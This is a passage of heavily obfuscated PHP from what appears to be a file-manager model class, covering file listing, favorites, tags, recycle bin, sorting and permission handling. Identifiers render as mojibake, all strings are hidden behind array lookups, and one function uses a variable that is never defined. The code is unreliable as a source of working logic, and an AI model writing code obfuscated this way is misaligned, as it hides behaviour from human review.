sourceListInfo($¤Ã•Ìä€, $Õë»Å¥ = false) { $¨˜İÊ¿¤ =& $_SERVER[©—Ò»ÅĞ]; $¤Ã•Ìä€ = $¤Ã•Ìä€ ? $¤Ã•Ìä€ : array(); $¤Ã•Ìä€ = array_filter(array_unique($¤Ã•Ìä€)); if (!$¤Ã•Ìä€) { return array(); } $ê´§Ÿ¤¡ = $this->where(array($¨˜İÊ¿¤[191] => array($¨˜İÊ¿¤[7], $¤Ã•Ìä€)))->select(); $this->_listDataApply($ê´§Ÿ¤¡, $Õë»Å¥); return array_to_keyvalue($ê´§Ÿ¤¡, $¨˜İÊ¿¤[191]); } public function pathInfoFilter(&$×çêØ…×) { $Ë‚”º¬Û =& $_SERVER[©—Ò»ÅĞ]; static $ŸÌì¼ª  = false; static $è ©Çº· = false; static $˜ç™ù = false; if (!$ŸÌì¼ª ) { $ÁÀæÜ£• = $Ë‚”º¬Û[493]; $ÁÀæÜ£• .= $Ë‚”º¬Û[494]; $ÁÀæÜ£• .= $Ë‚”º¬Û[495]; $³Æ±¾€Æ = $Ë‚”º¬Û[496]; $ç×Î°¢ = explode($Ë‚”º¬Û[50], $³Æ±¾€Æ); $ŸÌì¼ª  = explode($Ë‚”º¬Û[50], $ÁÀæÜ£•); $è ©Çº· = array(); foreach ($ŸÌì¼ª  as $øü‰­Û†) { if (in_array($øü‰­Û†, $ç×Î°¢)) { continue; } $è ©Çº·[] = $øü‰­Û†; } $˜ç™ù = explode($Ë‚”º¬Û[50], $Ë‚”º¬Û[497]); } foreach ($˜ç™ù as $ ËÁ’ü¢) { if (isset($×çêØ…×[$ ËÁ’ü¢])) { $×çêØ…×[$ ËÁ’ü¢] = intval($×çêØ…×[$ ËÁ’ü¢]); } } $×çêØ…×[$Ë‚”º¬Û[87]] = $Ë‚”º¬Û[498] . $×çêØ…×[$Ë‚”º¬Û[191]] . $Ë‚”º¬Û[499]; $×çêØ…×[$Ë‚”º¬Û[33]] = $×çêØ…×[$Ë‚”º¬Û[500]] == 1 ? $Ë‚”º¬Û[78] : $Ë‚”º¬Û[230]; $×çêØ…×[$Ë‚”º¬Û[188]] = $this->typeName($×çêØ…×[$Ë‚”º¬Û[188]]); if ($×çêØ…×[$Ë‚”º¬Û[500]] != 1) { $×çêØ…×[$Ë‚”º¬Û[166]] = $×çêØ…×[$Ë‚”º¬Û[501]]; unset($×çêØ…×[$Ë‚”º¬Û[501]]); } $ÓàÌ¯½ = $ŸÌì¼ª ; if (isset($×çêØ…×[$Ë‚”º¬Û[502]]) && $×çêØ…×[$Ë‚”º¬Û[502]][$Ë‚”º¬Û[503]] == -1) { $ÓàÌ¯½ = $è ©Çº·; } $×çêØ…× = array_field_key($×çêØ…×, $ÓàÌ¯½); return $×çêØ…×; } public function listUserFav() { $›ù§•  =& $_SERVER[©—Ò»ÅĞ]; $æ¾ÃÓúš = Model($›ù§• [504])->listData(); $Ì’œÙôÉ = array_filter_by_field($æ¾ÃÓúš, $›ù§• [33], $›ù§• [505]); $Ì’œÙôÉ = array_to_keyvalue($Ì’œÙôÉ, $›ù§• [12], $›ù§• [87]); if ($Ì’œÙôÉ) { $’³Ÿº = $this->listSource(array($›ù§• [506] => array($›ù§• [507], $Ì’œÙôÉ))); } $’³Ÿº = array_to_keyvalue($’³Ÿº[$›ù§• [446]], $›ù§• [191]); foreach ($æ¾ÃÓúš as &$™µûøû´) { $™µûøû´ = array($›ù§• [508] => $™µûøû´[$›ù§• [487]], $›ù§• [509] => $™µûøû´[$›ù§• [32]], $›ù§• [510] => $™µûøû´[$›ù§• [87]], $›ù§• [511] => $™µûøû´[$›ù§• [33]], $›ù§• [512] => $™µûøû´[$›ù§• [231]], $›ù§• [513] => $™µûøû´[$›ù§• [88]]); if ($™µûøû´[$›ù§• [33]] == $›ù§• [505] && $’³Ÿº[$™µûøû´[$›ù§• [87]]]) { $™µûøû´[$›ù§• [90]] = $’³Ÿº[$™µûøû´[$›ù§• [87]]]; } } unset($™µûøû´); return $æ¾ÃÓúš; } public function listUserTag($±²ª‹‡°) { $‚Éñ¸‹ =& $_SERVER[©—Ò»ÅĞ]; if ($±²ª‹‡° && !is_array($±²ª‹‡°)) { $±²ª‹‡° = array($±²ª‹‡°); } $Œ«©Á‡ã = Model($‚Éñ¸‹[514])->listData(); $È¨ÃµÂå = array(); $«¯¹í€ù = array(); foreach ($Œ«©Á‡ã as $‰’ŸÉÁè) { $şüÅàÒÃ = $‰’ŸÉÁè[$‚Éñ¸‹[87]]; if (!$şüÅàÒÃ) { continue; } if (!isset($«¯¹í€ù[$şüÅàÒÃ])) { $«¯¹í€ù[$şüÅàÒÃ] = array(); } $«¯¹í€ù[$şüÅàÒÃ][] = $‰’ŸÉÁè[$‚Éñ¸‹[515]]; $È¨ÃµÂå[$‰’ŸÉÁè[$‚Éñ¸‹[87]]] = $‰’ŸÉÁè; } $š„µˆÆÎ = array(); $ª„Ë„ã = array(); $°ƒú¸™è = array(); foreach ($«¯¹í€ù as $¢¸«£± => $İªÀİ¨š) { $™ÕèÙù“ = !0; if (!$±²ª‹‡°) { $š„µˆÆÎ[] = $¢¸«£±; continue; } foreach ($±²ª‹‡° as $áùˆÆ‰») { if (!in_array($áùˆÆ‰», $İªÀİ¨š)) { $™ÕèÙù“ = !1; break; } } if (!$™ÕèÙù“) { continue; } if (!is_numeric($¢¸«£±)) { $¼Ó˜ù¡” = $È¨ÃµÂå[$¢¸«£±]; $š÷ê‡¬ = array($‚Éñ¸‹[32] => $¼Ó˜ù¡”[$‚Éñ¸‹[32]], $‚Éñ¸‹[87] => $¼Ó˜ù¡”[$‚Éñ¸‹[87]], $‚Éñ¸‹[33] => $¼Ó˜ù¡”[$‚Éñ¸‹[33]], $‚Éñ¸‹[90] => array($‚Éñ¸‹[516] => 1), $‚Éñ¸‹[232] => !0); if ($¼Ó˜ù¡”[$‚Éñ¸‹[33]] == $‚Éñ¸‹[230]) { $°ƒú¸™è[] = $š÷ê‡¬; } if ($¼Ó˜ù¡”[$‚Éñ¸‹[33]] == $‚Éñ¸‹[78]) { $ª„Ë„ã[] = $š÷ê‡¬; } continue; } $š„µˆÆÎ[] = $¢¸«£±; } if ($š„µˆÆÎ) { $¸–¹¨Ğù = $this->listSource(array($‚Éñ¸‹[506] => array($‚Éñ¸‹[507], $š„µˆÆÎ))); } $¸–¹¨Ğù = $¸–¹¨Ğù ? $¸–¹¨Ğù : array($‚Éñ¸‹[85] => array(), $‚Éñ¸‹[86] => array()); $¸–¹¨Ğù[$‚Éñ¸‹[85]] = array_merge($¸–¹¨Ğù[$‚Éñ¸‹[85]], $ª„Ë„ã); $¸–¹¨Ğù[$‚Éñ¸‹[86]] = array_merge($¸–¹¨Ğù[$‚Éñ¸‹[86]], $°ƒú¸™è); if (isset($¸–¹¨Ğù[$‚Éñ¸‹[443]]) && count($š„µˆÆÎ) == $¸–¹¨Ğù[$‚Éñ¸‹[443]][$‚Éñ¸‹[444]]) { return $¸–¹¨Ğù; } $œ®–¤½Ï = array(); $¾şÌšœ¨ = array_to_keyvalue($¸–¹¨Ğù[$‚Éñ¸‹[85]], $‚Éñ¸‹[12], $‚Éñ¸‹[191]); $õÀ‚öÓ = array_to_keyvalue($¸–¹¨Ğù[$‚Éñ¸‹[86]], $‚Éñ¸‹[12], $‚Éñ¸‹[191]); $òşëî–î = array_merge($õÀ‚öÓ, $¾şÌšœ¨); foreach ($š„µˆÆÎ as $şüÅàÒÃ) { if (!in_array($şüÅàÒÃ, $òşëî–î)) { $œ®–¤½Ï[] = $şüÅàÒÃ; } } if ($œ®–¤½Ï) { Model($‚Éñ¸‹[517])->removeBySource($œ®–¤½Ï); } return $¸–¹¨Ğù; } public function listUserRecycle() { $¸÷±÷ıø =& $_SERVER[©—Ò»ÅĞ]; $İ¹è‰Æ” = Model($¸÷±÷ıø[518])->listData(); if (!$İ¹è‰Æ”) { return array(); } $€§ıö·š = array($¸÷±÷ıø[506] => array($¸÷±÷ıø[507], $İ¹è‰Æ”), $¸÷±÷ıø[519] => 1); return $this->listSource($€§ıö·š); } public function listSource($¥«Œâø±, $Ê¦úåË = 3000, $›Ç‰´¹° = false) { $š‚Ø¼Ğ† =& $_SERVER[©—Ò»ÅĞ]; if (!isset($¥«Œâø±[$š‚Ø¼Ğ†[520]])) { $¥«Œâø±[$š‚Ø¼Ğ†[520]] = 0; } if (isset($¥«Œâø±[$š‚Ø¼Ğ†[190]]) && $¥«Œâø±[$š‚Ø¼Ğ†[190]] == $š‚Ø¼Ğ†[228]) { $¥«Œâø±[$š‚Ø¼Ğ†[501]] = array($š‚Ø¼Ğ†[464], $š‚Ø¼Ğ†[12]); } if (isset($¥«Œâø±[$š‚Ø¼Ğ†[190]])) { $¥«Œâø±[$š‚Ø¼Ğ†[190]] = intval($¥«Œâø±[$š‚Ø¼Ğ†[190]]); } $Ì­™õÚé = $š‚Ø¼Ğ†[521]; $ÔÜó‹ºŞ = $this->field($Ì­™õÚé)->_makeOrder()->where($¥«Œâø±)->selectPage($Ê¦úåË); $this->_listPageCheck($ÔÜó‹ºŞ, $Ì­™õÚé, $¥«Œâø±); $this->_listDataApply($ÔÜó‹ºŞ[$š‚Ø¼Ğ†[446]], $›Ç‰´¹°); $this->_listMake($ÔÜó‹ºŞ); return $ÔÜó‹ºŞ; } private function _listPageCheck(&$õß€è„Õ, $—›µŒÓ, $÷³÷®Ú¨) { $ô™âà‘ =& $_SERVER[©—Ò»ÅĞ]; if (!is_array($õß€è„Õ[$ô™âà‘[443]])) { return; } $À­Ú’œ = $õß€è„Õ[$ô™âà‘[443]]; if ($À­Ú’œ[$ô™âà‘[445]] <= 1) { return; } if ($À­Ú’œ[$ô™âà‘[444]] >= 100000) { return; } if (Model($ô™âà‘[522])->get($ô™âà‘[523]) != $ô™âà‘[524]) { return; } $—›µŒÓ = str_replace(array($ô™âà‘[53], $ô™âà‘[417], $ô™âà‘[285]), $ô™âà‘[12], $—›µŒÓ); $—›µŒÓ = $ô™âà‘[525] . str_replace($ô™âà‘[50], $ô™âà‘[526], $—›µŒÓ) . $ô™âà‘[527]; $ûˆÉ•„¹ = $ô™âà‘[528]; $ûˆÉ•„¹ = $ûˆÉ•„¹ . $ô™âà‘[529]; $ŸöÇ–ä  = $À­Ú’œ[$ô™âà‘[439]] * ($À­Ú’œ[$ô™âà‘[428]] - 1) . $ô™âà‘[50] . $À­Ú’œ[$ô™âà‘[439]]; $Ğ­œÅöó = $this->_makeOrder(!0); $ÃÖ¾è¨Ä = $ô™âà‘[525] . str_replace($ô™âà‘[50], $ô™âà‘[526], $Ğ­œÅöó[0]); if (strpos($ÃÖ¾è¨Ä, $ô™âà‘[530])) { $ÃÖ¾è¨Ä = str_replace($ô™âà‘[530], $ô™âà‘[531], $ÃÖ¾è¨Ä); } else { $ÃÖ¾è¨Ä .= $ô™âà‘[532] . $Ğ­œÅöó[1]; } $¤ü…öĞ = array(); foreach ($÷³÷®Ú¨ as $ü•Êİ†¤ => $±ãÔìÚ¥) { $¤ü…öĞ[$ô™âà‘[525] . $ü•Êİ†¤] = $±ãÔìÚ¥; } $this->alias($ô™âà‘[533])->field($—›µŒÓ)->limit($ŸöÇ–ä )->order($ÃÖ¾è¨Ä); $¿‡Ôµ = $this->join($ûˆÉ•„¹)->where($¤ü…öĞ)->select(); if ($¿‡Ôµ) { $õß€è„Õ[$ô™âà‘[446]] = $¿‡Ôµ; } } protected function _makeOrder($áÎƒ•í = false) { $ äü§Õş =& $_SERVER[©—Ò»ÅĞ]; $úƒ¯áó’ = Model($ äü§Õş[534])->get($ äü§Õş[535]); $¬–„ù²„ = Model($ äü§Õş[534])->get($ äü§Õş[536]); $¦ıÇäàŒ = array($ äü§Õş[537] => $ äü§Õş[538], $ äü§Õş[539] => $ äü§Õş[540]); $¬ˆµŞ‡ä = array($ äü§Õş[32] => $ äü§Õş[32], $ äü§Õş[79] => $ äü§Õş[79], $ äü§Õş[166] => $ äü§Õş[501], $ äü§Õş[541] => $ äü§Õş[541], $ äü§Õş[542] => $ äü§Õş[543], $ äü§Õş[231] => $ äü§Õş[231], $ äü§Õş[88] => $ äü§Õş[88]); $šÒîàÍÀ = Input::get($ äü§Õş[544], $ äü§Õş[7], $úƒ¯áó’, array_keys($¬ˆµŞ‡ä)); $îŠØ™ê‡ = Input::get($ äü§Õş[545], $ äü§Õş[7], $¬–„ù²„, array_keys($¦ıÇäàŒ)); if (!in_array($šÒîàÍÀ, array_keys($¬ˆµŞ‡ä))) { $šÒîàÍÀ = $ äü§Õş[32]; } if (!in_array($îŠØ™ê‡, array_keys($¦ıÇäàŒ))) { $šÒîàÍÀ = $ äü§Õş[537]; } if ($šÒîàÍÀ == $ äü§Õş[32]) { } $İĞÈ—½¥ = $ äü§Õş[546] . $¬ˆµŞ‡ä[$šÒîàÍÀ] . $ äü§Õş[53] . $¦ıÇäàŒ[$îŠØ™ê‡]; $İĞÈ—½¥ = rtrim(trim($İĞÈ—½¥), $ äü§Õş[50]); if ($áÎƒ•í) { return array($İĞÈ—½¥, $¦ıÇäàŒ[$îŠØ™ê‡]); } return $this->order($İĞÈ—½¥); } protected function _listDataApplyItem($³ä¨•Ëı, $”ˆ§‘Ÿä = false) { $äü†ìçú = array($³ä¨•Ëı); $this->_listDataApply($äü†ìçú, $”ˆ§‘Ÿä); return $äü†ìçú[0]; } protected function _listDataApply(&$¶Ù§ŠÁ, $İ“õ€‹Ù = false) { $ì‘·ä¾ =& $_SERVER[©—Ò»ÅĞ]; if (!$¶Ù§ŠÁ) { $¶Ù§ŠÁ = array(); return; } $úóÜ±Ôğ = array_to_keyvalue($¶Ù§ŠÁ, $ì‘·ä¾[12], $ì‘·ä¾[191]); $úóÜ±Ôğ = array_unique($úóÜ±Ôğ); $úóÜ±Ôğ = array_to_int($úóÜ±Ôğ); $this->_listSourceCache($¶Ù§ŠÁ); if (!$İ“õ€‹Ù) { $this->_listAppendMeta($¶Ù§ŠÁ, $úóÜ±Ôğ); $this->_listAppendFileMeta($¶Ù§ŠÁ, $úóÜ±Ôğ); $this->_listAppendChildren($¶Ù§ŠÁ, $úóÜ±Ôğ); } $this->_listAppendPath($¶Ù§ŠÁ); $this->_listAppendAuth($¶Ù§ŠÁ); $this->_listAppendSourceInfo($¶Ù§ŠÁ, $úóÜ±Ôğ); $this->_listAppendUser($¶Ù§ŠÁ); $this->_listFilterInfo($¶Ù§ŠÁ, $İ“õ€‹Ù); $this->_listAppendAuthSecret($¶Ù§ŠÁ); } protected function _listSourceCache($Ë¶ôóÏ¾) { $ııÚÄå  =& $_SERVER[©—Ò»ÅĞ]; foreach ($Ë¶ôóÏ¾ as $ü¾õÙ) { self::$cacheSourceInfo[$ııÚÄå [547] . $ü¾õÙ[$ııÚÄå [191]]] = $ü¾õÙ; } } protected function _listFilterInfo(&$š£ËÂ½€, $”İØØ’© = false) { $è†¡«Î =& $_SERVER[©—Ò»ÅĞ]; foreach ($š£ËÂ½€ as &$Ï´’û¡„) { $Ï´’û¡„ = $this->pathInfoFilter($Ï´’û¡„); self::$cachePathInfo[$è†¡«Î[548] . intval($”İØØ’©) . $è†¡«Î[476] . $Ï´’û¡„[$è†¡«Î[191]]] = $Ï´’û¡„; } unset($Ï´’û¡„); } protected function _listMake(&$‰±«ß‡) { $©¦üîÚĞ =& $_SERVER[©—Ò»ÅĞ]; $‰±«ß‡[$©¦üîÚĞ[85]] = array(); $‰±«ß‡[$©¦üîÚĞ[86]] = array(); foreach ($‰±«ß‡[$©¦üîÚĞ[446]] as $ûùìåÉŠ) { $»…‹–’Û = $ûùìåÉŠ[$©¦üîÚĞ[500]] == 1 ? $©¦üîÚĞ[85] : $©¦üîÚĞ[86]; $‰±«ß‡[$»…‹–’Û][] = $ûùìåÉŠ; } unset($‰±«ß‡[$©¦üîÚĞ[446]]); } protected function _listAppendMeta(&$ª¸ûÆú¤, $ã±éÓû‚) { $şÏ’üæò =& $_SERVER[©—Ò»ÅĞ]; $¢É–•ô– = array($şÏ’üæò[506] => array($şÏ’üæò[507], $ã±éÓû‚)); $¹ßÉ…ö = Model($şÏ’üæò[549])->field($şÏ’üæò[550])->where($¢É–•ô–)->select(); if (!$¹ßÉ…ö) { return; } $¦ä»úàˆ = array($şÏ’üæò[551], $şÏ’üæò[552], $şÏ’üæò[531]); $ïÅİéÑË = array(); foreach ($¹ßÉ…ö as $¢÷ğû¦±) { if (!isset($ïÅİéÑË[$¢÷ğû¦±[$şÏ’üæò[191]]])) { $ïÅİéÑË[$¢÷ğû¦±[$şÏ’üæò[191]]] = array(); } if (in_array($¢÷ğû¦±[$şÏ’üæò[95]], $¦ä»úàˆ)) { continue; } if ($¢÷ğû¦±[$şÏ’üæò[95]] == $şÏ’üæò[553]) { $¢÷ğû¦±[$şÏ’üæò[451]] = $şÏ’üæò[554]; } $ïÅİéÑË[$¢÷ğû¦±[$şÏ’üæò[191]]][$¢÷ğû¦±[$şÏ’üæò[95]]] = $¢÷ğû¦±[$şÏ’üæò[451]]; } foreach ($ª¸ûÆú¤ as &$ú·Íş€) { $ú·Íş€[$şÏ’üæò[555]] = !1; if (isset($ïÅİéÑË[$ú·Íş€[$şÏ’üæò[191]]])) { $ú·Íş€[$şÏ’üæò[555]] = $ïÅİéÑË[$ú·Íş€[$şÏ’üæò[191]]]; } if ($this->fileIsLock($ú·Íş€) && $ú·Íş€[$şÏ’üæò[502]]) { $„ø²û§ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ú·Íş€[$şÏ’üæò[502]][$şÏ’üæò[503]] = AuthModel::authDisable($ú·Íş€[$şÏ’üæò[502]][$şÏ’üæò[503]], $„ø²û§); $ú·Íş€[$şÏ’üæò[502]][$şÏ’üæò[556]][$şÏ’üæò[502]] = $ú·Íş€[$şÏ’üæò[502]][$şÏ’üæò[503]]; } } unset($ú·Íş€); } protected function _listAppendFileMeta(&$ê³ŞØ¤„, $Ö×“¹) { $ß×…œØê =& $_SERVER[©—Ò»ÅĞ]; $Ü·âÌıÏ = array_to_keyvalue($ê³ŞØ¤„, $ß×…œØê[12], $ß×…œØê[557]); $Ü·âÌıÏ = array_filter(array_unique($Ü·âÌıÏ)); $Ü·âÌıÏ = array_to_int($Ü·âÌıÏ); if (!$Ü·âÌıÏ) { return; } $´²åÍ¹¹ = array($ß×…œØê[558] => array($ß×…œØê[507], $Ü·âÌıÏ)); $¾úÙĞ£¿ = $ß×…œØê[559]; $Áİ‚Œûí = Model($ß×…œØê[560])->field($¾úÙĞ£¿)->where($´²åÍ¹¹)->select(); $Áİ‚Œûí = array_to_keyvalue($Áİ‚Œûí, $ß×…œØê[557]); $ÇÊ‹¤÷ = Model($ß×…œØê[561])->field($ß×…œØê[562])->where($´²åÍ¹¹)->select(); $ÇÊ‹¤÷ = $ÇÊ‹¤÷ ? $ÇÊ‹¤÷ : array(); $£µŠ›Ì = array(); foreach ($ÇÊ‹¤÷ as $°œ­áŞ®) { if (!isset($£µŠ›Ì[$°œ­áŞ®[$ß×…œØê[557]]])) { $£µŠ›Ì[$°œ­áŞ®[$ß×…œØê[557]]] = array(); } $£µŠ›Ì[$°œ­áŞ®[$ß×…œØê[557]]][$°œ­áŞ®[$ß×…œØê[95]]] = $°œ­áŞ®[$ß×…œØê[451]]; } foreach ($ê³ŞØ¤„ as &$œ›¼é€) { $üÆùĞ = $œ›¼é€[$ß×…œØê[557]]; if (!$üÆùĞ || !is_array($Áİ‚Œûí[$üÆùĞ])) { continue; } $Ş‰ †Ë¼ = $Áİ‚Œûí[$üÆùĞ]; $Ş‰ †Ë¼[$ß×…œØê[79]] = $œ›¼é€[$ß×…œØê[79]]; $Ş‰ †Ë¼[$ß×…œØê[32]] = $œ›¼é€[$ß×…œØê[32]]; if (!$Ş‰ †Ë¼[$ß×…œØê[563]]) { Model($ß×…œØê[560])->fileMd5Check($Ş‰ †Ë¼); } if (!isset(self::$cacheFileInfo[$ß×…œØê[564] . $üÆùĞ])) { self::$cacheFileInfo[$ß×…œØê[564] . $üÆùĞ] = array_merge(array(), $Ş‰ †Ë¼); } unset($Áİ‚Œûí[$üÆùĞ][$ß×…œØê[87]]); $ı’“¸Ñı = isset($£µŠ›Ì[$üÆùĞ]) && is_array($£µŠ›Ì[$üÆùĞ]) ? $£µŠ›Ì[$üÆùĞ] : array(); $œ›¼é€[$ß×…œØê[167]] = array_merge($ı’“¸Ñı, $Áİ‚Œûí[$üÆùĞ]); if (isset($œ›¼é€[$ß×…œØê[167]][$ß×…œØê[182]])) { $œ›¼é€[$ß×…œØê[182]] = json_decode($œ›¼é€[$ß×…œØê[167]][$ß×…œØê[182]], !0); unset($œ›¼é€[$ß×…œØê[167]][$ß×…œØê[182]]); } } unset($œ›¼é€); } protected function _listAppendSourceInfo(&$ÄÆÀÔÂç, $ü§Š›öğ) { $Ò–°®¡ =& $_SERVER[©—Ò»ÅĞ]; $„‹á´‹ë = Model($Ò–°®¡[565])->listData(); $şõ¯‰œŒ = Model($Ò–°®¡[514])->listData(); $ĞÚùğûî = Model($Ò–°®¡[504])->listData(); $Õ‰»ï…ú = Model($Ò–°®¡[566])->listSimple(); $—‘É‹ö = array_to_keyvalue($„‹á´‹ë, $Ò–°®¡[487]); $›«½»„î = array_to_keyvalue_group($şõ¯‰œŒ, $Ò–°®¡[87], $Ò–°®¡[515]); $ÎäŸúÚ = array_to_keyvalue($ĞÚùğûî, $Ò–°®¡[87]); $ŒÙ¤° = array_to_keyvalue_group($Õ‰»ï…ú, $Ò–°®¡[191]); foreach ($ÄÆÀÔÂç as &$†Òúš¦’) { $†Òúš¦’[$Ò–°®¡[90]] = array($Ò–°®¡[567] => 0, $Ò–°®¡[568] => 0, $Ò–°®¡[569] => 0); if (isset($ÎäŸúÚ[$†Òúš¦’[$Ò–°®¡[191]]])) { $†Òúš¦’[$Ò–°®¡[90]][$Ò–°®¡[570]] = 1; $†Òúš¦’[$Ò–°®¡[90]][$Ò–°®¡[571]] = $ÎäŸúÚ[$†Òúš¦’[$Ò–°®¡[191]]][$Ò–°®¡[32]]; } if ($›«½»„î && $—‘É‹ö && isset($›«½»„î[$†Òúš¦’[$Ò–°®¡[191]]])) { $†Òúš¦’[$Ò–°®¡[90]][$Ò–°®¡[572]] = array(); foreach ($›«½»„î[$†Òúš¦’[$Ò–°®¡[191]]] as $ÚÔÕÁ‡„) { $Ä®ÖÆ = $—‘É‹ö[$ÚÔÕÁ‡„]; $†Òúš¦’[$Ò–°®¡[90]][$Ò–°®¡[572]][] = array($Ò–°®¡[573] => $Ä®ÖÆ[$Ò–°®¡[487]], $Ò–°®¡[509] => $Ä®ÖÆ[$Ò–°®¡[32]], $Ò–°®¡[574] => $Ä®ÖÆ[$Ò–°®¡[575]]); } } if ($ŒÙ¤° && isset($ŒÙ¤°[$†Òúš¦’[$Ò–°®¡[191]]])) { $†Òúš¦’[$Ò–°®¡[90]][$Ò–°®¡[576]] = array(); foreach ($ŒÙ¤°[$†Òúš¦’[$Ò–°®¡[191]]] as $áîığÔˆ) { $†Òúš¦’[$Ò–°®¡[90]][$Ò–°®¡[576]] = $this->shareFilterShow($áîığÔˆ); } } } unset($†Òúš¦’); return $ÄÆÀÔÂç; } protected function shareFilterShow($×ù¤æÆ) { $”‹µ¼ú™ =& $_SERVER[©—Ò»ÅĞ]; if (!$×ù¤æÆ) { return $×ù¤æÆ; } $†ÓÎ°³  = $”‹µ¼ú™[577]; if ($×ù¤æÆ[$”‹µ¼ú™[578]] == $”‹µ¼ú™[91]) { $†ÓÎ°³  .= $”‹µ¼ú™[579]; } if (is_array($×ù¤æÆ[$”‹µ¼ú™[580]]) && is_array($×ù¤æÆ[$”‹µ¼ú™[580]][$”‹µ¼ú™[581]])) { $×ù¤æÆ[$”‹µ¼ú™[580]][$”‹µ¼ú™[581]] = $”‹µ¼ú™[582]; } if (!$‹ó–Šêæ[$”‹µ¼ú™[583]] && $‹ó–Šêæ[$”‹µ¼ú™[191]] != $”‹µ¼ú™[228]) { $‹ó–Šêæ[$”‹µ¼ú™[583]] = KodIO::make($‹ó–Šêæ[$”‹µ¼ú™[191]]); } $×ù¤æÆ = array_field_key($×ù¤æÆ, explode($”‹µ¼ú™[50], $†ÓÎ°³ )); return $×ù¤æÆ; } protected function _listAppendChildren(&$Û¹†ƒª‘, $“ï…ˆŸ) { $äºŠíÂÑ =& $_SERVER[©—Ò»ÅĞ]; $Ş„í€Œè = array(); $´·Ü¦°® = array($äºŠíÂÑ[239] => 0, $äºŠíÂÑ[240] => 0); foreach ($Û¹†ƒª‘ as &$õïÎÏ«) { if (!$õïÎÏ«[$äºŠíÂÑ[500]]) { continue; } $Ş„í€Œè[] = intval($õïÎÏ«[$äºŠíÂÑ[191]]); } unset($õïÎÏ«); if (!$Ş„í€Œè) { return; } $­ÖáÁû = array($äºŠíÂÑ[190] => array($äºŠíÂÑ[7], $Ş„í€Œè), $äºŠíÂÑ[520] => 0); $…ÎÄœÂ† = array($äºŠíÂÑ[190], $äºŠíÂÑ[500], $äºŠíÂÑ[584] => $äºŠíÂÑ[585]); $¼å÷üÂê = $this->field($…ÎÄœÂ†)->where($­ÖáÁû)->group($äºŠíÂÑ[586])->select(); $¬º™ÛòÛ = array(); foreach ($¼å÷üÂê as $¾²Ü²÷í) { $ØÚßãçÇ = $¾²Ü²÷í[$äºŠíÂÑ[190]]; $­ã·¨Èœ = $¾²Ü²÷í[$äºŠíÂÑ[500]] == $äºŠíÂÑ[91] ? $äºŠíÂÑ[240] : $äºŠíÂÑ[239]; if (!isset($¬º™ÛòÛ[$ØÚßãçÇ])) { $¬º™ÛòÛ[$ØÚßãçÇ] = array($äºŠíÂÑ[239] => 0, $äºŠíÂÑ[240] => 0); } $¬º™ÛòÛ[$ØÚßãçÇ][$­ã·¨Èœ] += $¾²Ü²÷í[$äºŠíÂÑ[585]]; } foreach ($Û¹†ƒª‘ as &$õïÎÏ«) { if (!$õïÎÏ«[$äºŠíÂÑ[500]]) { continue; } $º“Ğ›èñ = is_array($¬º™ÛòÛ[$õïÎÏ«[$äºŠíÂÑ[191]]]) ? $¬º™ÛòÛ[$õïÎÏ«[$äºŠíÂÑ[191]]] : $´·Ü¦°®; $õïÎÏ«[$äºŠíÂÑ[240]] = $º“Ğ›èñ[$äºŠíÂÑ[240]]; $õïÎÏ«[$äºŠíÂÑ[239]] = $º“Ğ›èñ[$äºŠíÂÑ[239]]; unset($õïÎÏ«[$äºŠíÂÑ[501]]); } unset($õïÎÏ«); } protected function _listAppendAuth(&$§…Š‹Œû) { $µö¡²Ÿ¸ =& $_SERVER[©—Ò»ÅĞ]; $íöà•Åª = array(); foreach ($§…Š‹Œû as $›¸Ó³ö) { if ($›¸Ó³ö[$µö¡²Ÿ¸[188]] == self::TYPE_GROUP) { $íöà•Åª[] = intval($›¸Ó³ö[$µö¡²Ÿ¸[191]]); } } if (!$íöà•Åª) { return; } $ø÷”Î“á = array_to_keyvalue($§…Š‹Œû, $µö¡²Ÿ¸[191]); $¦’‹Ñ”º = Model($µö¡²Ÿ¸[587])->getSourceList($íöà•Åª, $ø÷”Î“á); $¡“Ëº½Å = KodUser::isRoot(); foreach ($§…Š‹Œû as $üáÕÖ¾ş => &$›¸Ó³ö) { $›¸Ó³ö[$µö¡²Ÿ¸[502]] = $¦’‹Ñ”º[$›¸Ó³ö[$µö¡²Ÿ¸[191]]]; if (!$›¸Ó³ö[$µö¡²Ÿ¸[502]] && $›¸Ó³ö[$µö¡²Ÿ¸[188]] == self::TYPE_GROUP) { $›¸Ó³ö[$µö¡²Ÿ¸[502]] = Action($µö¡²Ÿ¸[588])->pathGroupAuthMake($›¸Ó³ö[$µö¡²Ÿ¸[589]]); if (!$›¸Ó³ö[$µö¡²Ÿ¸[502]] && !$¡“Ëº½Å) { $›¸Ó³ö[$µö¡²Ÿ¸[233]] = !1; $›¸Ó³ö[$µö¡²Ÿ¸[232]] = !1; } } if ($›¸Ó³ö[$µö¡²Ÿ¸[502]]) { $›¸Ó³ö[$µö¡²Ÿ¸[233]] = AuthModel::authCheckEdit($›¸Ó³ö[$µö¡²Ÿ¸[502]][$µö¡²Ÿ¸[503]]); $›¸Ó³ö[$µö¡²Ÿ¸[232]] = AuthModel::authCheckView($›¸Ó³ö[$µö¡²Ÿ¸[502]][$µö¡²Ÿ¸[503]]); } $this->groupPathDisplay($›¸Ó³ö); } unset($›¸Ó³ö); } public function _listAppendAuthSecret(&$™½ê¶®) { $˜Šõ¼Ş– =& $_SERVER[©—Ò»ÅĞ]; if (Model($˜Šõ¼Ş–[522])->get($˜Šõ¼Ş–[590]) != $˜Šõ¼Ş–[91]) { return; } static $È‰ú–æ÷ = false; if (!$È‰ú–æ÷) { $¿ªˆ½œ¸ = Model($˜Šõ¼Ş–[591]); $©¹ŒÅŸù = Model($˜Šõ¼Ş–[592]); $È‰ú–æ÷ = $©¹ŒÅŸù->listData(); $È‰ú–æ÷ = array_to_keyvalue($È‰ú–æ÷, $˜Šõ¼Ş–[191]); $œ¥¬ÂÃ¦ = json_decode(Model($˜Šõ¼Ş–[522])->get($˜Šõ¼Ş–[593]), !0); $œ¥¬ÂÃ¦ = array_to_keyvalue($œ¥¬ÂÃ¦, $˜Šõ¼Ş–[487]); foreach ($È‰ú–æ÷ as $Å÷¥•—… => $ÁÃÏ‘Úû) { $„‰–œñã = $œ¥¬ÂÃ¦[$ÁÃÏ‘Úû[$˜Šõ¼Ş–[594]]]; if (!$„‰–œñã) { $©¹ŒÅŸù->remove($ÁÃÏ‘Úû[$˜Šõ¼Ş–[487]]); unset($È‰ú–æ÷[$Å÷¥•—…]); continue; } $¢Ç½¶‡ = $¿ªˆ½œ¸->listData($„‰–œñã[$˜Šõ¼Ş–[502]]); if 